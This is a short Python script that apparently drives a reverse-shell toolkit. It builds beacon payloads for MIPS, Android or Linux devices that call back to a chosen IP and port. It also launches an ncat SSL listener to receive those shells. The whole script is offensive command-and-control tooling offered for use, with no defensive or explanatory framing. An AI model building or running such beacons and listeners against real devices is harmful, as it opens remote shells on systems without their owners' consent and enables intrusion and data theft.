#!/usr/bin/env python3

import argparse
import os
import sys
import subprocess

def get_args():
	# Define variables arguments for the program

	parser = argparse.ArgumentParser()

	parser.add_argument('-o', '--os', action='store', help='Specify if you are making this for mips or android')
	parser.add_argument('-i', '--ip', action='store', help='Specify the IP you would like the shell to beacon to')
	parser.add_argument('-p', '--port', action='store', required=True, help='Specify the port you would like the beacon to connect to')
	parser.add_argument('-s', '--server', action='store_true', help='This option will start the listening server')

	args = parser.parse_args()
	return args

def start_server(port):
	try:
		print("Starting the listening server on {}\n".format(port))
		listen = "ncat --ssl --ssl-cert server.pem --ssl-key server.key -lvp {}".format(port)
		os.system(listen)

	except Exception as E:
		print(E)
		sys.exit(1)

def build_shell(ip, port, system):

	print("Selection is: {}".format(system.lower()))

	if system.lower() == "mips":
		mipsbeacon = "make mips LHOST={} LPORT={}".format(ip, port)
		subprocess.getstatusoutput(mipsbeacon)

	elif system.lower() == "android":
		androidbeacon = "make android LHOST={} LPORT={}".format(ip, port)
		subprocess.getstatusoutput(androidbeacon)

	elif system.lower() == "linux":
		linbeacon = "make linux LHOST={} LPORT={}".format(ip, port)
		subprocess.getstatusoutput(linbeacon)

	else:
		print("You must select an operating system of either linux or android")
		sys.exit(1)



def main():

	options = get_args()

	server = options.server
	ip = options.ip
	port = options.port
	system = options.os

	if options.server:
		start_server(port)

	elif options.os and options.ip:
		build_shell(ip, port, system)

	else:
		print("You must either specify a -s option to start listening server or a -o option with a -i option to specify an OS to build for and an IP to beacon to")
		sys.exit(1)

if __name__ =="__main__":
	main()

